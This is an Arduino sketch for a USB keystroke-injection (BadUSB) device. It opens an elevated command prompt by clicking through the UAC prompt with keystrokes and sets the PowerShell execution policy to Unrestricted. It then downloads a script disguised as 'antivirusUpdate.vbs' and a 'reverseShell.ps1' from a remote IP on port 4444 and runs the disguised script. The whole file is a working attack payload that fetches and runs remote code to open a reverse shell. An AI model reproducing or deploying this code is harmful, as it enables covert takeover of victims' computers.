#include "DigiKeyboardDe.h"

void setup() {
  
  DigiKeyboardDe.delay(4000);
  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardDe.delay(100);
  DigiKeyboardDe.print("cmd");
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT + MOD_SHIFT_LEFT);
  DigiKeyboardDe.delay(900);
  DigiKeyboardDe.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboardDe.delay(900);
  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
  DigiKeyboardDe.delay(500);
  DigiKeyboardDe.println("powershell.exe Set-ExecutionPolicy Unrestricted -Force");
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.println("curl 83.29.10.2:4444/attackFolder/antivirusUpdate.vbs -o antivirusUpdate.vbs");
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.println("curl 83.29.10.2:4444/attackFolder/reverseShell.ps1 -o reverseShell.ps1");
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.println("antivirusUpdate.vbs");
  DigiKeyboardDe.delay(1000);
  DigiKeyboardDe.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
}

void loop() {
}
